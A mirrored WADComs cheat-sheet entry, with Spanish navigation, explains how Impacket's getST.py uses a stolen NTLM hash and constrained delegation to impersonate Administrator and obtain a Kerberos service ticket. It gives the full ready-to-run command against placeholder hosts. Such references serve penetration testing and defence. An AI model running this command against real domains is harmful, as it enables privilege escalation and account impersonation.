# WADComs: Impacket-getST-Hash

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Hash`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account using the hashed password of user `john` and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Service: www

	Host Name: server01.test.local

	Username: john

	Hash: :2a3de7fe356ee524cc9f3d579f2e0aa7

	Impersonated User: Administrator

## Comando

```bash
python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
- http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
